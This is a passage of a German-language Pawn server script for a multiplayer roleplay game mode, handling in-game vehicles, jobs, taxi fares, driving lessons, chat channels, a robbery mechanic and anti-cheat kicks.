						PlayerCuffed[suspect] = 10 + random(10);
						TazerBereit[playerid] = 0;
						SetTimerEx("TazerBereitForPlayer",5000,0,"i",playerid);
						SetTimerEx("Unfreeze",15000,0,"i",suspect);
					}
					break;
				}
	    	}
    	}
    	/*else
    	{
    	    for(new suspect = 0; suspect < MAX_PLAYERS; suspect++)
			{
   				if(IsPlayerConnected(suspect) && EntfernungZwischenSpielern(playerid,suspect) < 2)
				{
				    if(playerid == suspect) continue;
	    			if(GetPlayerTargetPlayer(playerid) == suspect)
	    			{
						SendClientMessage(playerid,COLOR_BLUE,"Du hast geschlagen!");
						SendClientMessage(suspect,COLOR_BLUE,"Du wurdest geschlagen!");
    				}
    	    	}
   			}
    	}*/
	}
	if(newkeys == KEY_WALK)
	{
		if(IstSpielerInFrak(playerid,1) || IstSpielerInFrak(playerid,2))
		{
		    new WaffenListe[12][2] = {
		    {17,20},
		    {17,20},
		    {4,1},
		    {3,1},
		    {23,50},
		    {24,50},
			{25,25},
			{29,200},
			{31,100},
			{33,50},
			{43,50},
			{46,1}
		    };
			new Float:X,Float:Y,Float:Z;
			for(new x = 0; x < sizeof(Waffe); x++)
			{
			    GetDynamicObjectPos(Waffe[x],X,Y,Z);
			    if(IsPlayerInRangeOfPoint(playerid,1.0,X,Y-0.7,14.1))
			    {
			        AntiCheat[playerid][cAnti] = 2;
					GebeWaffe(playerid,WaffenListe[x][0],WaffenListe[x][1]);
					break;
			    }
			}
		}
	}
 	new veh = GetPlayerVehicleID(playerid);
    if(veh != 0)
    {
        if(GetPlayerVehicleSeat(playerid) == 0)
        {
            #if BLINK_ALLOW_EMERGENCY == 1
            if(PRESSED(KEY_ANALOG_UP))
            {
                if(!IsCarBlinking(veh)) SetCarBlinking(veh, 2), SetPVarInt(playerid, "blink-car", veh);
    		    else DisableCarBlinking(veh);
            }
            #endif
        	if(PRESSED(KEY_LOOK_LEFT))
            {
    			if(!IsCarBlinking(veh)) SetCarBlinking(veh, 0), SetPVarInt(playerid, "blink-car", veh);
    		    else DisableCarBlinking(veh);
        	}
        	else if(PRESSED(KEY_LOOK_RIGHT))
            {
    		    if(!IsCarBlinking(veh)) SetCarBlinking(veh, 1), SetPVarInt(playerid, "blink-car", veh);
    		    else DisableCarBlinking(veh);
        	}

            if(IsCarBlinking(veh))
            {
                new Float:a, Float:b = BlinkR[veh];
                GetVehicleZAngle(veh, a);

                if(BlinkSide[veh] == 0)
                {
                    b+=BLINK_TURN_ANGLE;
                    if(b > 360.0) b -=360.0;
                    if(a < b-180) a = a+360;
                	if(b < a-180) b = b+360;

                    if(a > b) DisableCarBlinking(veh);
                }
                else if(BlinkSide[veh] == 1)
                {
                    b-=BLINK_TURN_ANGLE;
                    if(b < 0.0) b = 360.0 + b;
                    if(a < b-180) a = a+360;
                	if(b < a-180) b = b+360;

                    if(a < b) DisableCarBlinking(veh);
                }
            }
        }
    }
	return 1;
}
forward AttachVehiclePos(vid,vehicleid);
public AttachVehiclePos(vid,vehicleid)
{
	new Float:X,Float:Y,Float:Z;
	GetVehiclePos(vid,APosX[vid],APosY[vid],Z);
	GetVehiclePos(vehicleid,X,Y,Z);
	APosX[vid] = X-APosX[vid];
	APosY[vid] = Y-APosY[vid];
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
    if(oldstate == PLAYER_STATE_DRIVER)
    {
        #if BLINK_DISABLE_ON_EXIT_VEHICLE == 0
        return 1;
        #else
        if(BlinkSide[GetPVarInt(playerid, "blink-car")] != 2) DisableCarBlinking(GetPVarInt(playerid, "blink-car"));
        #endif
    }
	new vehicleid = GetPlayerVehicleID(playerid);
	if(newstate == PLAYER_STATE_DRIVER)
	{
		if(adienst[playerid] == 0)
		{
	 		for(new h = 0; h < MAX_AAUTOS; h++)
			{
				if(IsPlayerInAnyVehicle(playerid))
				{
	     			if(vehicleid == AutoInfo[h][iCreate])
	     			{
	     			    new str[250];
	        			new vtext[20];
						if(AutoDaten[GetVehicleModel(vehicleid)-399][aKraftstoff] == 0)
						{vtext = "Diesel";}else{vtext = "Benzin";}
						format(str,sizeof(str),"{FF5000}Autohaus\n\n{FF5000}Fahrzeugname: {FEFEFE}%s\n{FF5000}Preis: {FEFEFE}%.2f\n{FF5000}Tank: {FEFEFE}%dL   %s\n{FF5000}Verbrauch 100/km: {FEFEFE}%dL{FEFEFE}",AutoDaten[GetVehicleModel(vehicleid)-399][AutoName],AutoInfo[h][iPreis],AutoDaten[GetVehicleModel(vehicleid)-399][MaxBenzin],vtext,AutoDaten[GetVehicleModel(vehicleid)-399][aVerbrauch]);
						ShowPlayerDialog(playerid,DIALOG_AHAUS,DIALOG_STYLE_MSGBOX,"Autohaus",str,"Kaufen","Abbrechen");
					}
				}
			}
		}
	}
	if(newstate == PLAYER_STATE_ONFOOT)
	{
		for(new x = 0; x < sizeof(TachoText[]); x++) PlayerTextDrawHide(playerid,TachoText[playerid][x]);
	    new string[60];
	    if(Fahrpreis[playerid] != 0 && TaxiFahrer[playerid] != -1)
	    {
	        TaxiFahrt[playerid] = (Meter[GetPlayerVehicleID(TaxiFahrer[playerid])]-TaxiFahrt[playerid])/250;
	        GebeGeld(TaxiFahrer[playerid],Fahrpreis[playerid]*TaxiFahrt[playerid]);
	        GebeGeld(playerid,-Fahrpreis[playerid]*TaxiFahrt[playerid]);
	        format(string,sizeof string,"Du zahlst %.2f$ an den Taxifahrer!",Fahrpreis[playerid]*TaxiFahrt[playerid]);
			SendClientMessage(playerid,COLOR_ORANGE,string);
			format(string,sizeof string,"Du hast %.2f$ für die Fahrt bekommen!",Fahrpreis[playerid]*TaxiFahrt[playerid]);
			SendClientMessage(TaxiFahrer[playerid],COLOR_ORANGE,string);
			TaxiFahrer[playerid] = -1;
			TaxiFahrt[playerid] = 0;
			Fahrpreis[playerid] = 0;
		}
	}
	if( (newstate == 2 && oldstate == 3) || (newstate == 3 && oldstate == 2) && SpielerInfo[playerid][uAdmin] > 0)
	{
	    new string[90];
	 	SendClientMessage(playerid,COLOR_LIGHTRED,"Du wurdest gekickt, Grund: Vehicle Enter Hack!");
   		format(string,sizeof string,"County Islands: %s wurde gekickt, Grund: Vehicle Enter Hack",PlayerName(playerid));
		SendMessageToAll(COLOR_LIGHTRED,string);
		KWBLog(PlayerName(playerid),"System","Kick","Vehicle Enter Hack");
 		Kick(playerid);
	}
	if(newstate == PLAYER_STATE_DRIVER)
	{
	    if(IsPlayerNPC(playerid)) return 1;
		if(!IstEinKeinFuehrerscheinFahrzeug(GetPlayerVehicleID(playerid)) && SpielerInfo[playerid][uEingeloggt])
		if(AutosFahrbar[playerid] == 0)
		{
		    for(new x = 1; x < 18; x++)
			{
			    for(new y = 0; y < 20; y++)
			    {
			        if(vehicleid == FrakFahrzeuge[x][y][FID])
			        {
			            if(IstSpielerInFrak(playerid,x))
			            {
			                if(FrakFahrzeuge[x][y][FAbgeschleppt] == 1) { RemovePlayerFromVehicle(playerid); SendClientMessage(playerid,COLOR_RED,"Dieses Fahrzeug ist abgeschleppt, du musst es freikaufen!"); return 1; }
			                if(SpielerInfo[playerid][uRang] < FrakFahrzeuge[x][y][FRang]) { RemovePlayerFromVehicle(playerid); SendClientMessage(playerid,COLOR_RED,"Dein Rang reicht für dieses Fahrzeug nicht aus!"); return 1; }
			            }
			            else if(IstSpielerInFrak(playerid,3) || IstSpielerInFrak(playerid,4))
			            {

			            }
			            else
						{
						    if(x != 6)
						    {
								RemovePlayerFromVehicle(playerid);
								SendClientMessage(playerid,COLOR_RED,"Du hast keinen Schlüssel!");
								return 1;
							}
							else
							{
								if(!IsPlayerInDynamicArea(playerid,FSZone))
								{
								    RemovePlayerFromVehicle(playerid);
									SendClientMessage(playerid,COLOR_RED,"Du hast keinen Schlüssel!");
									return 1;
								}
								else
								{
								    new veh = FrakFahrzeuge[x][y][FID];
								    if((IstEinLKW(veh) && SpielerInfo[playerid][uLKWschein] == 0) || (IstEinRoller(veh) && SpielerInfo[playerid][uRollerschein] == 0) || (IstEinMotorrad(veh) && SpielerInfo[playerid][uMotorradschein] == 0) || (!IstEinBoot(veh) && !IstEinFlugzeug(veh) && !IstEinHeli(veh) && SpielerInfo[playerid][uFuehrerschein] == 0))
								    {
								    	ShowPlayerDialog(playerid,DIALOG_FAHRSCHULE,DIALOG_STYLE_MSGBOX,"Fahrprüfung","Willst du die Fahrprüfung starten?","Ja","Nein");
								    	return 1;
							    	}
								}
							}
						}
			        }
			    }
			}
			for(new x = 0; x < 2; x++)
			{
			    if(vehicleid == SAuto[playerid][x][sID] && SAuto[playerid][x][abgeschleppt] == 1)
			    {
			         autokey[playerid] = x;
					 return ShowPlayerDialog(playerid,DIALOG_FREIK,DIALOG_STYLE_MSGBOX,"Fahrzeug freikaufen","Möchtest du dein Fahrzeug für 120$ freikaufen?","Ja","Nein");
			    }
			}
		}
		for(new x = 0; x < sizeof(Ausstellung); x++)
		{
		    if(vehicleid == Ausstellung[x])
		    {
		    	SendClientMessage(playerid,COLOR_RED,"Dies ist ein Ausstellungsmodell!");
				return RemovePlayerFromVehicle(playerid);
		    }
		}
		for(new y = 0; y < 2; y++)
		{
			for(new x = 0; x < sizeof(AutohausAutos[])-1; x++)
			{
		    	if(IsValidVehicle(AutohausAutos[y][x][0]) && vehicleid == AutohausAutos[y][x][0])
		    	{
		    		SendClientMessage(playerid,COLOR_RED,"Fahrzeuge kannst du im Info-Icon erwerben!");
					return RemovePlayerFromVehicle(playerid);
			    }
			}
		}
		if(!IstEinKeinFuehrerscheinFahrzeug(GetPlayerVehicleID(playerid)))
		{
		    new string[20];
	    	PlayerTextDrawSetString(playerid,TachoText[playerid][5],AutoDaten[GetVehicleModel(GetPlayerVehicleID(playerid))-399][AutoName]);
			format(string, sizeof(string), "%d/%dL",Benzin[vehicleid],AutoDaten[GetVehicleModel(vehicleid)-399][MaxBenzin]);
			PlayerTextDrawSetString(playerid,TachoText[playerid][14],string);
			new engine, lights, alarm, doors, bonnet, boot, objective;
	 		GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective);
	  		if(engine == VEHICLE_PARAMS_OFF || engine == -1) PlayerTextDrawSetString(playerid, TachoText[playerid][8], "Motor: ~r~aus");
	    	else PlayerTextDrawSetString(playerid, TachoText[playerid][8], "Motor: ~g~~h~ein");

	    	if(lights == VEHICLE_PARAMS_OFF || lights == -1) PlayerTextDrawSetString(playerid, TachoText[playerid][9], "Licht: ~r~aus");
	    	else PlayerTextDrawSetString(playerid, TachoText[playerid][9], "Licht: ~g~~h~ein");

	    	if(doors == VEHICLE_PARAMS_ON || doors == -1) PlayerTextDrawSetString(playerid, TachoText[playerid][15], "~r~abgeschlossen");
	    	else PlayerTextDrawSetString(playerid, TachoText[playerid][15], "~g~aufgeschlossen");
	    	if(ci_map_state[playerid] == false)
	    	{
				for(new x = 0; x < sizeof(TachoText[]); x++) PlayerTextDrawShow(playerid,TachoText[playerid][x]);
			}
			if(IstEinBoot(vehicleid))
			{
				if(SpielerInfo[playerid][uBootsschein] < 1) SendClientMessage(playerid, COLOR_GREY, "Achtung: Fahren ohne Bootsschein ist strafbar! /motor oder Taste 'n' /licht oder Taste '2'");
			}
			else if(IstEinHeli(vehicleid))
			{
				if(SpielerInfo[playerid][uHelischein] < 1) SendClientMessage(playerid, COLOR_GREY, "Achtung: Fliegen ohne Helischein ist strafbar! /motor oder Taste 'n' /licht oder Taste '2'");
			}
			else if(IstEinMotorrad(vehicleid))
			{
				if(SpielerInfo[playerid][uMotorradschein] < 1) SendClientMessage(playerid, COLOR_GREY, "Achtung: Fahren ohne Motorradschein ist strafbar! /motor oder Taste 'n' /licht oder Taste '2'");
	   		}
			else if(IstEinLKW(vehicleid))
			{
				if(SpielerInfo[playerid][uLKWschein] < 1) SendClientMessage(playerid, COLOR_GREY, "Achtung: Fahren ohne LKWSchein ist strafbar! /motor oder Taste 'n' /licht oder Taste '2'");
			}
			else if(IstEinRoller(vehicleid))
			{
				if(SpielerInfo[playerid][uRollerschein] < 1)SendClientMessage(playerid, COLOR_GREY, "Achtung: Fahren ohne Rollerschein ist strafbar! /motor oder Taste 'n' /licht oder Taste '2'");
			}
			else
			{
				if(SpielerInfo[playerid][uFuehrerschein] < 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "Achtung: Fahren ohne Führerschein ist strafbar! /motor oder Taste 'n' /licht oder Taste '2'");
				}
			}
		}
		for(new x = 0; x < sizeof(Fahrschullkw); x++)
		{
			if(vehicleid == Fahrschullkw[x])
			{
			    if(Fahrstunde[playerid] == 3)
				{
				    Fahrschulcp[playerid] = 1;
                	SetPlayerCheckpoint(playerid,1626.9459,-8512.8496,1.6860-1,3.0);
                    SendClientMessage(playerid,COLOR_GREEN,"Fahre nun die Checkpoints mit deinem Fahrzeug ab.");
                    SendClientMessage(playerid,COLOR_GREEN,"Solltest du das Fahrzeug verlassen, ist die Prüfung beendet!");
				}
				else
				{
					RemovePlayerFromVehicle(playerid);
					SendClientMessage(playerid,COLOR_RED,"Du bist in keiner LKW-Fahrstunde!");
				}
				break;
			}
		}
		for(new x = 0; x < sizeof(Fahrschulmoto); x++)
		{
			if(vehicleid == Fahrschulmoto[x])
			{
			    if(Fahrstunde[playerid] == 2)
				{
				    Fahrschulcp[playerid] = 1;
                	SetPlayerCheckpoint(playerid,1626.9459,-8512.8496,1.6860-1,3.0);
                    SendClientMessage(playerid,COLOR_GREEN,"Fahre nun die Checkpoints mit deinem Fahrzeug ab.");
                    SendClientMessage(playerid,COLOR_GREEN,"Solltest du das Fahrzeug verlassen, ist die Prüfung beendet!");
				}
				else
				{
					RemovePlayerFromVehicle(playerid);
					SendClientMessage(playerid,COLOR_RED,"Du bist in keiner Motorrad-Fahrstunde!");
				}
				break;
			}
		}
		for(new x = 0; x < sizeof(Fahrschulautos); x++)
		{
			if(vehicleid == Fahrschulautos[x])
			{
			    if(Fahrstunde[playerid] == 1)
				{
    				Fahrschulcp[playerid] = 1;
                	SetPlayerCheckpoint(playerid,1626.9459,-8512.8496,1.6860-1,3.0);
                	SendClientMessage(playerid,COLOR_GREEN,"Fahre nun die Checkpoints mit deinem Fahrzeug ab.");
                    SendClientMessage(playerid,COLOR_GREEN,"Solltest du das Fahrzeug verlassen, ist die Prüfung beendet!");
				}
				else
				{
					RemovePlayerFromVehicle(playerid);
					SendClientMessage(playerid,COLOR_RED,"Du bist in keiner Auto-Fahrstunde!");
				}
				break;
			}
		}
		new str[150];
		if(AutosFahrbar[playerid] == 0)
		{
		    for(new x = 0; x < sizeof(holzi); x++)
			{
				if(vehicleid == holzi[x])
				{
   					new engine, lights, alarm, doors, bonnet, boot, objective;
					GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
					SetVehicleParamsEx(vehicleid, engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
				    if(SpielerInfo[playerid][uJob] != 6)
					{
					    RemovePlayerFromVehicle(playerid);
						SendClientMessage(playerid,COLOR_RED,"Du bist kein Holzfäller!");
						anticheatpl[playerid] ++;
						SetTimerEx("RESETPL", 10000, false, "d", playerid);
						if(anticheatpl[playerid] == 5)
						{
							format(str,sizeof(str),"%s wurde gekickt wegen Spam!",PlayerName(playerid));
							SendClientMessageToAll(COLOR_LIGHTRED,str);
							SetTimerEx("KICKHIM", 200, false, "d", playerid);
						}
					}
					break;
				}
			}
			for(new x = 0; x < sizeof(ReinigungsFahrzeug); x++)
			{
				if(vehicleid == ReinigungsFahrzeug[x])
				{
   					new engine, lights, alarm, doors, bonnet, boot, objective;
					GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
					SetVehicleParamsEx(vehicleid, engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
				    if(SpielerInfo[playerid][uJob] != 1)
					{
					    RemovePlayerFromVehicle(playerid);
						SendClientMessage(playerid,COLOR_RED,"Du bist kein Müllmann!");
						anticheatpl[playerid] ++;
						SetTimerEx("RESETPL", 10000, false, "d", playerid);
						if(anticheatpl[playerid] == 5)
						{
							format(str,sizeof(str),"%s wurde gekickt wegen Spam!",PlayerName(playerid));
							SendClientMessageToAll(COLOR_LIGHTRED,str);
							SetTimerEx("KICKHIM", 200, false, "d", playerid);
						}
					}
					break;
				}
			}
			for(new x = 0; x < sizeof(Taxi); x++)
			{
				if(vehicleid == Taxi[x])
				{
					new engine, lights, alarm, doors, bonnet, boot, objective;
					GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
					SetVehicleParamsEx(vehicleid, engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
				    if(SpielerInfo[playerid][uJob] != 2)
					{
					    RemovePlayerFromVehicle(playerid);
						SendClientMessage(playerid,COLOR_RED,"Du bist kein Taxifahrer!");
						anticheatpl[playerid] ++;
						SetTimerEx("RESETPL", 10000, false, "d", playerid);
						if(anticheatpl[playerid] == 5)
						{
							format(str,sizeof(str),"%s wurde gekickt wegen Spam!",PlayerName(playerid));
							SendClientMessageToAll(COLOR_LIGHTRED,str);
							SetTimerEx("KICKHIM", 200, false, "d", playerid);
						}
	    			}
					break;
				}
			}
			for(new x = 0; x < sizeof(Bus); x++)
			{
				if(vehicleid == Bus[x])
				{
				    if(SpielerInfo[playerid][uJob] != 3)
					{
	   					new engine, lights, alarm, doors, bonnet, boot, objective;
						GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
						SetVehicleParamsEx(vehicleid, engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
					    RemovePlayerFromVehicle(playerid);
						SendClientMessage(playerid,COLOR_RED,"Du bist kein Busfahrer!");
						anticheatpl[playerid] ++;
						SetTimerEx("RESETPL", 10000, false, "d", playerid);
						if(anticheatpl[playerid] == 5)
						{
							format(str,sizeof(str),"%s wurde gekickt wegen Spam!",PlayerName(playerid));
							SendClientMessageToAll(COLOR_LIGHTRED,str);
							SetTimerEx("KICKHIM", 200, false, "d", playerid);
						}
	    			}
					break;
				}
			}
			for(new x = 0; x < sizeof(FarmerFahrzeug); x++)
			{
				if(vehicleid == FarmerFahrzeug[x])
				{
					new engine, lights, alarm, doors, bonnet, boot, objective;
					GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
					SetVehicleParamsEx(vehicleid, engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
				    if(SpielerInfo[playerid][uJob] != 4)
					{
					    RemovePlayerFromVehicle(playerid);
						SendClientMessage(playerid,COLOR_RED,"Du bist kein Farmer!");
						anticheatpl[playerid] ++;
						SetTimerEx("RESETPL", 10000, false, "d", playerid);
						if(anticheatpl[playerid] == 5)
						{
							format(str,sizeof(str),"%s wurde gekickt wegen Spam!",PlayerName(playerid));
							SendClientMessageToAll(COLOR_LIGHTRED,str);
							SetTimerEx("KICKHIM", 200, false, "d", playerid);
						}
	    			}
					break;
				}
			}
			for(new x = 0; x < sizeof(Trucker); x++)
			{
				if(vehicleid == Trucker[x])
				{
					new engine, lights, alarm, doors, bonnet, boot, objective;
					GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
					SetVehicleParamsEx(vehicleid, engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
				    if(SpielerInfo[playerid][uJob] != 5)
					{
					    RemovePlayerFromVehicle(playerid);
						SendClientMessage(playerid,COLOR_RED,"Du bist kein Trucker!");
						anticheatpl[playerid] ++;
						SetTimerEx("RESETPL", 10000, false, "d", playerid);
						if(anticheatpl[playerid] == 5)
						{
							format(str,sizeof(str),"%s wurde gekickt wegen Spam!",PlayerName(playerid));
							SendClientMessageToAll(COLOR_LIGHTRED,str);
							SetTimerEx("KICKHIM", 200, false, "d", playerid);
						}
	    			}
					break;
				}
			}
			for(new x = 0; x < sizeof(Trucker); x++)
			{
				if(vehicleid == Trucker[x])
				{
					if(PlayerTruckmodus[playerid] == 2)
					{
					    RemovePlayerFromVehicle(playerid);
                        SendClientMessage(playerid,COLOR_RED,"Du musst deinen Trucker erst beladen!");
					}
	    			else if(PlayerTruckmodus[playerid]==4)
	    			{
	    			    SendClientMessage(playerid,COLOR_GREEN,"Fahre nun zum nächsten Checkpoint!");
	    			    SetPlayerCheckpoint(playerid,6592.0186,-7866.0112,4.4086-1,5);
	    			}
	    			else if(PlayerTruckmodus[playerid]==5)
	    			{
	    			    SendClientMessage(playerid,COLOR_GREEN,"Fahre nun zum nächsten Checkpoint!");
	    			    SetPlayerCheckpoint(playerid,1591.8182,-9338.7002,6.3965-1,5);
	    			}
	    			else if(PlayerTruckmodus[playerid]==6)
	    			{
	    			    SendClientMessage(playerid,COLOR_GREEN,"Fahre nun zum nächsten Checkpoint!");
	    			    SetPlayerCheckpoint(playerid,1751.7233,-9183.1631,4.4401-1,5);
	    			}
	    			else if(PlayerTruckmodus[playerid]==7)
	    			{
	    			    SendClientMessage(playerid,COLOR_GREEN,"Fahre nun zurück zum Depot!");
	    			    SetPlayerCheckpoint(playerid,4092.2583,-9281.1318,4.4130-1,5);
	    			}


				}
			}
		}
	}
	if(newstate == PLAYER_STATE_PASSENGER)
	{
	    if(!IstEinKeinFuehrerscheinFahrzeug(GetPlayerVehicleID(playerid)) && SpielerInfo[playerid][uEingeloggt])
 		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 420 && GetVehicleDriver(GetPlayerVehicleID(playerid)) != INVALID_PLAYER_ID && Fahrpreis[GetVehicleDriver(GetPlayerVehicleID(playerid))] != 0.00)
	    {
	        new string[50];
			format(string,sizeof string,"Der Fahrpreis beträgt: %.2f$",Fahrpreis[GetVehicleDriver(GetPlayerVehicleID(playerid))]);
			SendClientMessage(playerid,COLOR_YELLOW,string);
			Fahrpreis[playerid] = Fahrpreis[GetVehicleDriver(GetPlayerVehicleID(playerid))];
			TaxiFahrt[playerid] = Meter[GetPlayerVehicleID(playerid)];
			TaxiFahrer[playerid] = GetVehicleDriver(GetPlayerVehicleID(playerid));
    	}
    	new string[125];
    	PlayerTextDrawSetString(playerid,TachoText[playerid][5],AutoDaten[GetVehicleModel(GetPlayerVehicleID(playerid))-399][AutoName]);
		format(string, sizeof(string), "%d/%dL",Benzin[vehicleid],AutoDaten[GetVehicleModel(vehicleid)-399][MaxBenzin]);
		PlayerTextDrawSetString(playerid,TachoText[playerid][14],string);
		new engine, lights, alarm, doors, bonnet, boot, objective;
 		GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective);
  		if(engine == VEHICLE_PARAMS_OFF || engine == -1) PlayerTextDrawSetString(playerid, TachoText[playerid][8], "Motor: ~r~aus");
    	else PlayerTextDrawSetString(playerid, TachoText[playerid][8], "Motor: ~g~~h~ein");

    	if(lights == VEHICLE_PARAMS_OFF || lights == -1) PlayerTextDrawSetString(playerid, TachoText[playerid][9], "Licht: ~r~aus");
    	else PlayerTextDrawSetString(playerid, TachoText[playerid][9], "Licht: ~g~~h~ein");
    	if(doors == VEHICLE_PARAMS_ON || doors == -1) PlayerTextDrawSetString(playerid, TachoText[playerid][15], "~r~abgeschlossen");
    	else PlayerTextDrawSetString(playerid, TachoText[playerid][15], "~g~aufgeschlossen");
    	if(ci_map_state[playerid] == false)
    	{
			for(new x = 0; x < sizeof(TachoText[]); x++) PlayerTextDrawShow(playerid,TachoText[playerid][x]);
		}
	}
	if(newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER)
    {
        AntiCheat[playerid][cAnti] = 2;
        new SWaffe[2];
        GetPlayerWeaponData(playerid, 4, SWaffe[0], SWaffe[1]);
        SetPlayerArmedWeapon(playerid, SWaffe[0]);
    }
	return 1;
}
cmd:testbomb(playerid,params[])
{
	if(SpielerInfo[playerid][uAdmin] >= 4)
	{
		Verstauen(playerid,bombenobject,1);
		Verstauen(playerid,19942,1);
	}else KeineRechte(playerid);
	return 1;
}
public OnVehicleStreamIn(vehicleid, forplayerid)
{
	if(IstEinKeinFuehrerscheinFahrzeug(vehicleid))
	{
		new engine, lights, alarm, doors, bonnet, boot, objective;
 		GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
  		SetVehicleParamsEx(vehicleid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, boot, objective);
 	}
	return 1;
}
forward spamreset(playerid);
public spamreset(playerid)
{
    anticheatpl2[playerid] = 0;
	return 1;
}
public rob_timer(playerid)
{
	new Float:X,Float:Y,Float:Z,Float:rob_m,str[128];
	GetPlayerPos(rob_targetID[playerid],X,Y,Z);
	if(IsPlayerInRangeOfPoint(playerid,2.0,X,Y,Z))
	{
		rob_m = SpielerInfo[rob_targetID[playerid]][uGeld] / 100.0 * 5.0; // WICHTIG HIER DEINE GELD ABFRAGEN REIN MACHEN
		GebeGeld(playerid,rob_m);
		GebeGeld(rob_targetID[playerid],-rob_m);
		format(str,sizeof(str),"Raub erfolgreich! du hast %0.00f$ erhalten!",rob_m);
		SendClientMessage(playerid,-1,str);
		format(str,sizeof(str),"Du hast durch einen Raub %0.00f$ verloren!",rob_m);
		rob_sperre[playerid]=true;
        robTM2[playerid] = SetTimerEx("rob_sperreTM", 1000*60*15, false, "i", playerid);
		SendClientMessage(rob_targetID[playerid],-1,str);
		SpielerInfo[playerid][uWantedLevel] += 2;
	}else{
		SendClientMessage(playerid,-1,"Der Raub wurde abgebrochen! Du hast dich zu weit entfernt.");
	}
	inROB[playerid]=false;
	KillTimer(robTM[playerid]);
	rob_targetID[playerid]=-1;
	return 1;
}
public rob_sperreTM(playerid)
{
    rob_sperre[playerid]=false;
    return 1;
}
public tree_timer()
{
	KillTimer(baumTM);
	generate_tree();
}
public OnPlayerText(playerid, text[])
{
	new str[600];
	if(!strlen(text))return 0;
	format(str,sizeof(str),"%s schreibt: %s",PlayerName(playerid),text);
    log(playerid, 3, str);
    anticheatpl2[playerid] ++;
    SetTimerEx("spamreset", 3000, false, "d", playerid);
	if(anticheatpl2w[playerid] == 3)
	{
	    format(str,sizeof(str),"%s wurde gekickt wegen Spam!",PlayerName(playerid));
	    SendClientMessageToAll(COLOR_LIGHTRED,str);
	    Kick(playerid);
	}
	else if(anticheatpl2[playerid] > 3 && anticheatpl2w[playerid] < 3)
	{
	    anticheatpl2[playerid] = 0;
	    anticheatpl2w[playerid] ++;
	    SendClientMessage(playerid,COLOR_LIGHTRED,"Bitte hör auf zu Spamen!");
	}
    if(SpielerInfo[playerid][uAFK] != 300) SpielerInfo[playerid][uAFK] = 0;
    if(SpielerInfo[playerid][uStumm] == 1)
	{
 		SendClientMessage(playerid,COLOR_RED,"Du kannst nicht reden, denn du bist gemutet!");
 		return 0;
	}
	else
	{
	    if(Channel[playerid] == 0)
	    {
	        if(Handycall[playerid] != -1 && Handycall[Handycall[playerid]] == playerid)
	        {
	            format(text,256,"Handy %d: %s",SpielerInfo[playerid][uHandynummer],text);
	            SendClientMessage(playerid,COLOR_LIGHTBLUE,text);
	            SendClientMessage(Handycall[playerid],COLOR_LIGHTBLUE,text);
	        }
	        else
	        {
			    format(text,256,"%s: %s",PlayerName(playerid),text);
			    SendRadiusMessage(playerid,20.0,text,COLOR_GREY);
			    SetPlayerChatBubble(playerid, text, COLOR_GREY, 15.0, 2000);
		    }
	    }
	    else if(Channel[playerid] == 1)//Fraktion
	    {
	        format(text,256,"%s: %s",PlayerName(playerid),text);
			if(SpielerInfo[playerid][uMitglied] == 0 && SpielerInfo[playerid][uLeiter] == 0)
			{
				SendClientMessage(playerid,COLOR_RED,"Du bist in keiner Fraktion!");
			}
	        else if(SpielerInfo[playerid][uMitglied] != 0) FraktionsNachricht(SpielerInfo[playerid][uMitglied],COLOR_LIGHTGREEN,text);
			else FraktionsNachricht(SpielerInfo[playerid][uLeiter],COLOR_LIGHTGREEN,text);
		}
		else if(Channel[playerid] == 2)//Global
	    {
	        if(OCAus == 1) SendClientMessage(playerid,COLOR_RED,"Der O-Chat ist ausgeschaltet!");
	        else
	        {
			    format(text, 256, "[Global] %s: %s", PlayerName(playerid), text);
				SendMessageToAll(COLOR_OOC,text);
			}
		}
		else if(Channel[playerid] == 3)//Schreien
		{
		    SetPlayerChatBubble(playerid, text, COLOR_RED, 30.0, 3000);
    		format(text, 256, "%s schreit: %s", PlayerName(playerid), text);
			SendRadiusMessage(playerid,30.0,text,COLOR_RED);
		}
		else if(Channel[playerid] == 4)//Nachrichten
		{
		    format(text, 256, "[Reporter] %s: %s", PlayerName(playerid), text);
			SendMessageToAll(COLOR_ORANGE,text);
		}
		return 0;
	}
}
forward bildweg(playerid);
public bildweg(playerid)
{
    TextDrawHideForPlayer(playerid,blitzerfl);
	return 1;
}
forward blitzkann(playerid);
public blitzkann(playerid)
{
    kannblitz[playerid] = 0;
	return 1;
}


public OnPlayerUpdate(playerid)
{
    if(Abschleppen[GetPlayerVehicleID(playerid)] > 0) return 0;
	if(!IsPlayerNPC(playerid))
	{
	    if(SpielerInfo[playerid][uAdmin] == 0)
	    {
		    if(GetPlayerWeapon(playerid) == 16 || GetPlayerWeapon(playerid) == 26 || GetPlayerWeapon(playerid) == 35 || GetPlayerWeapon(playerid) == 36 || GetPlayerWeapon(playerid) == 38 || GetPlayerWeapon(playerid) == 39 || GetPlayerWeapon(playerid) == 40 || GetPlayerWeapon(playerid) == 44 || GetPlayerWeapon(playerid) == 45)
			{
			    new string[256];
                SendClientMessage(playerid,COLOR_LIGHTRED,"Du wurdest gekickt, Grund: Waffen Hack!");
   				format(string,sizeof string,"County Islands: %s wurde gekickt, Grund: Waffen Hack",PlayerName(playerid));
				SendMessageToAll(COLOR_LIGHTRED,string);
